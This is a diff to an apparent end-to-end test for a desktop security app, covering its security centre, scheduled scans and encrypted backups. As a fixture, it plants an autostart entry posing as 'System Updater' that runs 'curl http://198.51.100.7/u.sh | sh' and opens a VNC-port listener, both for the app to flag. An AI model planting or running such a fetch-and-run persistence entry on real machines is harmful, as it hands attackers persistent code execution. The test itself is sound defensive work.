@@ -5,8 +5,9 @@
  */
 import assert from "node:assert/strict";
 import { createHash } from "node:crypto";
-import { mkdir, mkdtemp, readdir, stat, writeFile } from "node:fs/promises";
+import { mkdir, mkdtemp, readFile, readdir, stat, writeFile } from "node:fs/promises";
 import { createServer } from "node:http";
+import { createServer as createTcpServer } from "node:net";
 import { createRequire } from "node:module";
 import { tmpdir } from "node:os";
 import { dirname, join } from "node:path";
@@ -90,6 +91,11 @@ await writeFile(
   join(profile, "settings.json"),
   JSON.stringify({ serverUrl: "http://localhost:8799", watchFolders: [downloads], watchEnabled: true, autoQuarantine: true, useClamav: true, cloudLookup: false, language: "en", ransomwareWatch: true, protectedFolders: [documents] }),
 );
+const home = join(work, "home");
+await mkdir(join(home, ".config", "autostart"), { recursive: true });
+await writeFile(join(home, ".config", "autostart", "updater.desktop"), "[Desktop Entry]\nType=Application\nName=System Updater\nExec=sh -c 'curl http://198.51.100.7/u.sh | sh'\n");
+// A program reachable from the network on the VNC port, which the security centre should flag.
+const vnc = createTcpServer().listen(5900, "0.0.0.0");
 await writeFile(join(files, "eicar.com"), EICAR);
 await writeFile(join(files, "sample.bin"), SAMPLE);
 await writeFile(join(files, "notes.txt"), "Shopping list: milk, bread, eggs");
@@ -98,7 +104,7 @@ await writeFile(join(files, "invoice.pdf"), Buffer.concat([Buffer.from("MZ"), Bu
 const app = await electron.launch({
   executablePath: require("electron"),
   args: [join(root, "dist", "main.js"), "--no-sandbox"],
-  env: { ...process.env, SENTINEL_DESKTOP_PROFILE: profile, SENTINEL_DESKTOP_HOME: files },
+  env: { ...process.env, HOME: home, SENTINEL_DESKTOP_PROFILE: profile, SENTINEL_DESKTOP_HOME: files },
 });
 const page = await app.firstWindow();
 await page.waitForSelector("nav button");
@@ -186,6 +192,74 @@ await page.waitForSelector("#link-code");
 assert.equal(device.linked, false);
 step("removing the computer from the account unlinks it on the server");
 
+// Security centre.
+await page.click('[data-tab="security"]');
+await page.waitForSelector("#firewall");
+await page.waitForSelector("#ports >> text=Port 5900");
+assert.match(await page.locator("#ports").innerText(), /VNC/);
+const startupText = await page.locator("#startup").innerText();
+assert.match(startupText, /System Updater/);
+assert.match(startupText, /Downloads and runs a script at every start/);
+assert.doesNotMatch(startupText, /New since your last review/, "the first check is the baseline");
+await writeFile(join(home, ".config", "autostart", "helper.desktop"), "[Desktop Entry]\nName=Helper\nExec=/tmp/helper --quiet\n");
+await page.click("#security-recheck");
+await page.waitForSelector("#startup >> text=New since your last review");
+await shot(page, "desktop-security");
+await page.click("text=Mark all as reviewed");
+await page.waitForFunction(() => !document.querySelector("#startup")?.textContent?.includes("New since your last review"));
+step("security centre: risky open port, startup entry running a downloaded script, new startup item since last review");
+
+// Scheduled scan settings save.
+await page.selectOption("#scan-frequency", "daily");
+await page.selectOption("#scan-hour", "3");
+await page.waitForSelector("#schedule >> text=Next run");
+const savedSchedule = JSON.parse(await readFile(join(profile, "settings.json"), "utf8")).scanSchedule;
+assert.deepEqual(savedSchedule, { frequency: "daily", day: 0, hour: 3 });
+step("scheduled scan saved");
+
+// Encrypted backup, check and restore. System dialogs are answered by the test.
+const answerDialog = (paths) => app.evaluate(({ dialog }, chosen) => { dialog.showOpenDialog = async () => ({ canceled: false, filePaths: chosen }); }, paths);
+const usb = join(work, "usb");
+await mkdir(usb);
+await writeFile(join(documents, "family-photo.jpg"), Buffer.alloc(300_000, 7));
+await answerDialog([documents]);
+await page.click("#backup-add-folder");
+await page.locator("#backup-folders li", { hasText: documents }).waitFor();
+await answerDialog([usb]);
+await page.click("text=Choose…");
+await page.locator("#backup-destination", { hasText: usb }).waitFor();
+await page.fill("#backup-password", "short");
+await page.click("#backup-save-password");
+await page.waitForSelector("text=at least 10 characters");
+await page.fill("#backup-password", "family photos 2026!");
+await page.click("#backup-save-password");
+await page.waitForSelector("text=A password is set.");
+await page.click("#backup-now");
+await page.waitForSelector("text=Backup finished", { timeout: 30000 });
+const archives = (await readdir(usb)).filter((name) => name.endsWith(".sbk"));
+assert.equal(archives.length, 1);
+assert.ok(!(await readFile(join(usb, archives[0]))).includes(Buffer.from("family-photo")), "names are encrypted too");
+await page.click("text=Check or restore a backup");
+await page.fill("#open-password", "wrong password here");
+await answerDialog([join(usb, archives[0])]);
+await page.click("text=Check a backup file");
+await page.waitForSelector("text=Wrong password");
+await page.fill("#open-password", "family photos 2026!");
+await page.click("text=Check a backup file");
+await page.waitForSelector("text=The backup is intact");
+const restoreInto = join(work, "restored");
+await app.evaluate(({ dialog, shell }, [file, target]) => {
+  let call = 0;
+  dialog.showOpenDialog = async () => ({ canceled: false, filePaths: [call++ === 0 ? file : target] });
+  shell.openPath = async () => "";
+}, [join(usb, archives[0]), restoreInto]);
+await page.click("text=Restore a backup file");
+await page.waitForSelector("text=Restored");
+assert.deepEqual(await readFile(join(restoreInto, "Documents", "family-photo.jpg")), await readFile(join(documents, "family-photo.jpg")));
+await shot(page, "desktop-backup");
+step("encrypted backup: weak password refused, wrong password detected, check and restore give back identical files");
+
+await page.click('[data-tab="settings"]');
 await page.selectOption("#language", "ar");
 await page.waitForSelector("text=الحماية");
 assert.equal(await page.evaluate(() => document.documentElement.dir), "rtl");
@@ -195,4 +269,5 @@ step("interface switches to Arabic, right to left");
 
 await app.close();
 server.close();
+vnc.close();
 console.log("All desktop checks passed.");
